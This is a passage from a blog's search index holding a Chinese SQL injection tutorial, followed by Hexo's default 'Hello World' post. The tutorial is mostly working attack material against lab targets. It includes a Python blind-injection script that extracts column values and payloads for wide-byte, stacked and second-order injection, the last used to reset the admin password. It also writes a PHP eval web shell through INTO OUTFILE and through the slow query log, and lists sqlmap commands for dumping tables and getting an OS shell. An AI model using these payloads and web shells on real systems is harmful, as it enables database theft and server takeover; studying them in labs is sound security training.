class="hljs-string">&#x27;%23&amp;submit=%E6%9F%A5%E8%AF%A2&#x27;</span>).content.decode()<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is: lucy@test.com&#x27;</span> <span class="hljs-keyword">in</span> source:<br>                    columns_name.append(<span class="hljs-built_in">chr</span>(three))<br>        columns_name.append(<span class="hljs-string">&#x27;|&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(columns_name))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[ &#x27;</span> + db_name + <span class="hljs-string">&#x27; ]&#x27;</span> + <span class="hljs-string">&#x27;数据库下面的&#x27;</span> + <span class="hljs-string">&#x27;[ &#x27;</span> + table_name + <span class="hljs-string">&#x27; ]&#x27;</span> + <span class="hljs-string">&#x27;表的字段为: &#x27;</span> + <span class="hljs-string">&#x27;&#x27;</span>.join(columns_name))<br><br><span class="hljs-comment"># 字段信息</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">contents</span>(<span class="hljs-params">db_name, table_name, column_name, pos</span>):<br>    all_columns = []<br>    <span class="hljs-keyword">for</span> two <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">33</span>):<br>        <span class="hljs-keyword">for</span> three <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br>            source = requests.get(<br>                <span class="hljs-string">&#x27;http://127.0.0.1/pk/vul/sqli/sqli_blind_b.php?name=lucy%27+AND+%28ASCII%28SUBSTRING%28%28SELECT+&#x27;</span> +<br>                column_name + <span class="hljs-string">&#x27;+FROM+&#x27;</span> + table_name + <span class="hljs-string">&#x27;+LIMIT+&#x27;</span> + <span class="hljs-built_in">str</span>(<br>                    pos) + <span class="hljs-string">&#x27;%2C1%29%2C&#x27;</span> + <span class="hljs-built_in">str</span>(<br>                    two) + <span class="hljs-string">&#x27;%2C1%29%29%29%3D&#x27;</span> + <span class="hljs-built_in">str</span>(<br>                    three) + <span class="hljs-string">&#x27;%23&amp;submit=%E6%9F%A5%E8%AF%A2&#x27;</span>).content.decode()<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your email is: lucy@test.com&#x27;</span> <span class="hljs-keyword">in</span> source:<br>                all_columns.append(<span class="hljs-built_in">chr</span>(three))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(all_columns))<br>    <span class="hljs-built_in">print</span>(<br>        <span class="hljs-string">&#x27;[ &#x27;</span> + db_name + <span class="hljs-string">&#x27; ]&#x27;</span> + <span class="hljs-string">&#x27;数据库下面的&#x27;</span> + <span class="hljs-string">&#x27;[ &#x27;</span> + table_name + <span class="hljs-string">&#x27; ]&#x27;</span> + <span class="hljs-string">&#x27;表的&#x27;</span> + <span class="hljs-string">&#x27;[ &#x27;</span> + column_name + <span class="hljs-string">&#x27; ]&#x27;</span> + <span class="hljs-string">&#x27;字段值为&#x27;</span> +<br>        <span class="hljs-string">&#x27;&#x27;</span>.join(<br>            all_columns))<br></code></pre></td></tr></table></figure></li></ul><h2 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><ul><li><p>原理::当mysql使用GBK编码的时候,会认为两个字符是一个汉字(前一个ASCII码要大于128,才会得到汉字的范围,0×81-0xFE开头+0×5C的字符都可以),这就是mysql特性,因为GBK是多字节编码,他认为两个字节是一个汉字,在进行参数带入的时候,%df%27会解析成汉字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=1--+</span><br><span class="hljs-string">常规写法在遇到后端时 会对\&#x27;</span>进行转义处理 导致<span class="hljs-keyword">sql</span>语句异常 如下:<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1\&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--+&#x27; 这样是无法正确执行 &#x27;and 1=1&#x27; 注入判断语句的</span><br>这时利用mysql数据库的GBK编码属性 修改原来的注入语句 如下:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>d5<span class="hljs-string">&#x27; and 1=1--+</span><br><span class="hljs-string">这种写法在后端去对\&#x27;</span>进行转义的时候会出发mysql的GBK编码特殊属性 导致<span class="hljs-keyword">sql</span>语句正常执行 如下:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>d5<span class="hljs-operator">%</span><span class="hljs-number">5</span>c<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">and</span><span class="hljs-operator">%</span><span class="hljs-number">201</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">2</span>d<span class="hljs-operator">%</span><span class="hljs-number">2</span>d<span class="hljs-operator">%</span><span class="hljs-number">2</span>b <br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1誠&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--+  这样成功闭合了单引号</span><br>正常后端及<span class="hljs-keyword">sql</span>解析逻辑为:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>d5<span class="hljs-string">&#x27; and 1=1--+</span><br><span class="hljs-string">username=1 0xd5 0x5c 0x27 0×20 and 0×20 1=1 0x2d 0x2d 0x2b</span><br><span class="hljs-string">在连接数据库进行查询的时候 SET NAMES ‘gbk’ 这样导致数据库在识别到 0xd50x5c的时候将其解析成&#x27;</span>誠<span class="hljs-string">&#x27; 从而实现了引号闭合</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><ul><li><p>原理::在SQL语句中都是以;结尾,但是我们在;后面再添加一条SQL语句,也是会执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show database;#</span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> tables;#<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from users;#</span><br></code></pre></td></tr></table></figure></li><li><p>触发条件</p><ul><li>后端使用了可以执行多条sql语句的函数 如php中的<code>mysqli_multi_query()</code></li><li>目标未对<code>;</code>进行过滤</li></ul></li></ul><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><ul><li><p>原理::将构造的sql语句转义存储在数据库后,用户去做查询的时候会将这条存储的语句调用执行,导致二次注入</p><ul><li><p>在注册账号的时候用户名设置为<code>admin&#39;#</code> 之后修改用户名密码的时候后端会执行<code>update</code>语句去更新密码 在拼接用户名的时候 <code>&#39;#</code>实现了sql语句的截断 从而执行特定sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">原<span class="hljs-keyword">sql</span>语句<br><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$new_password&#x27;</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$old_password&#x27;</span>;<br>在更新密码的时候 会判断用户名和密码是否正确 这时会将用户名带入检查 这是<span class="hljs-keyword">sql</span>语句变成如下样式<br><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$new_password&#x27;</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span>#<span class="hljs-string">&#x27; and password=&#x27;</span>$old_password<span class="hljs-string">&#x27;; 导致直接修改admin密码</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="文件I-O"><a href="#文件I-O" class="headerlink" title="文件I&#x2F;O"></a>文件I&#x2F;O</h2><ul><li><p><code>load_file</code> 文件读取</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,load_file(&#x27;</span>D:\\<span class="hljs-number">1.</span>txt<span class="hljs-string">&#x27;)--+</span><br></code></pre></td></tr></table></figure></li><li><p>into outfile &#x2F; into dumpfile</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,&quot;&lt;?php @eval($_POST(&#x27;</span>x<span class="hljs-string">&#x27;))?&gt;&quot; into outfile &#x27;</span>C:<span class="hljs-operator">/</span>shell.php<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure></li><li><p>当<code>secure_file_priv=</code>默认关闭的时候 可以通过sql注入拿到<code>phpMyAdmin</code>后台登陆密码 进入后台开启日志记录</p><p><code>set global slow_query_log=1</code> 开启慢查询日志</p><p><code>show variables like “%char%</code> 查看慢日志绝对地址</p><p><img src="/blogs/img/image-20231106194902578.png"></p></li></ul><p><code>set global slow_query_log_file=&#39;C:\\phpstudy\\PHPTutorial\\WWW\\shell.php&#39;</code>修改日志文件的绝对路径以及文件名</p><p><img src="/blogs/img/image-20231106195502417.png"></p><ul><li><p>这是我们执行耗时的sql查询 会将查询语句记录在日志中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,select &quot;&lt;?php @eval($_POST[&#x27;</span>shell<span class="hljs-string">&#x27;]);?&gt;&quot; or sleep(11)--+</span><br></code></pre></td></tr></table></figure><p><img src="/blogs/img/image-20231106195845877.png"></p></li></ul><p>到这里我们使用文件包含去包含这个<code>shell.php</code>即可出发代码 从而实现绕过<code>secure_file_priv=</code>的限制</p><h1 id="SQLmap工具使用"><a href="#SQLmap工具使用" class="headerlink" title="SQLmap工具使用"></a>SQLmap工具使用</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span> 进行注入测试：<br>sqlmap <span class="hljs-operator">-</span>u &quot;http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1&quot; <span class="hljs-comment">--level=2 //level等级从1到5 等级越高检测的参数接口越多</span><br><br><span class="hljs-number">2.</span> 获取所有数据库名：<br>sqlmap <span class="hljs-operator">-</span>u &quot;http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1&quot; <span class="hljs-comment">--dbs</span><br><br><span class="hljs-number">3.</span> 获取当前使用的数据库名：<br>sqlmap <span class="hljs-operator">-</span>u &quot;http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1&quot; <span class="hljs-comment">--current-db</span><br><br><span class="hljs-number">4.</span> 指定数据库名，<span class="hljs-comment">--tables获取此数据库下的所有表名：</span><br>sqlmap <span class="hljs-operator">-</span>u &quot;http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1&quot; <span class="hljs-operator">-</span>D &quot;error&quot; <span class="hljs-comment">--tables</span><br><br><span class="hljs-number">5.</span> 指定数据库和表，<span class="hljs-comment">--columns获取此表下的列名：</span><br>sqlmap <span class="hljs-operator">-</span>u &quot;http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1&quot; <span class="hljs-operator">-</span>D &quot;error&quot; <span class="hljs-operator">-</span>T &quot;error_flag&quot; <span class="hljs-comment">--columns</span><br><br><span class="hljs-number">6.</span> 知道数据库，表，列名，可以直接dump拖库：<br>sqlmap <span class="hljs-operator">-</span>u &quot;http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1&quot; <span class="hljs-operator">-</span>D &quot;error&quot; <span class="hljs-operator">-</span>T &quot;error_flag&quot; <span class="hljs-operator">-</span>C &quot;flag,id&quot; <span class="hljs-comment">--dump</span><br><br><span class="hljs-number">7.</span> <span class="hljs-comment">--is-dba查看当前用户是否是DBA（Database Administrator）数据库管理员：</span><br>sqlmap <span class="hljs-operator">-</span>u &quot;http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1&quot; <span class="hljs-comment">--dbms=mysql --is-dba  //--dbms=mysql指定数据库为mysql了，就不会再去猜数据库类型。</span><br><br><span class="hljs-number">8.</span> <span class="hljs-comment">--batch能让sqlmap自动化进行。（中途需要选择时，不需要我们手动选择，他会选择默认选项。）</span><br><br>如果是post传参的话，需要抓包保存成txt。然后将txt上传到kali有写入文件权限的文件夹里，让sqlmap去读取，并且用<span class="hljs-operator">-</span>p来指定post传参。<br> sqlmap <span class="hljs-operator">-</span>r .<span class="hljs-operator">/</span><span class="hljs-number">111.</span>txt <span class="hljs-operator">-</span>p adname<br> <br> <span class="hljs-comment">--delay=1  //延时一秒</span><br><br><span class="hljs-comment">--random-agent&quot;参数来启用一个随机User-Agent</span><br><br><span class="hljs-comment">--os-cmd,--os-shell都可以执行系统命令。</span><br><span class="hljs-comment">--os-cmd可以单次执行系统命令，进行返回结果。如：--os-cmd=&#x27;whoami&#x27;</span><br><span class="hljs-comment">--os-shell可以尝试直接获取一个交互式的shell。</span><br><span class="hljs-comment">--file-write=&quot;shell.php&quot;  --file-dest=&quot;/tmp/shell.php&quot;第一个是shell文件，第二个是shell上传位置。</span><br><span class="hljs-comment">--is-dba查看是否是管理员权限。</span><br><span class="hljs-comment">--priv-esc权限提升</span><br>–<span class="hljs-keyword">skip</span><span class="hljs-operator">=</span>&quot;user-agent&quot; 指定不进行测试的参数<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/blogs/2023/11/14/hello-world/"/>
    <url>/blogs/2023/11/14/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
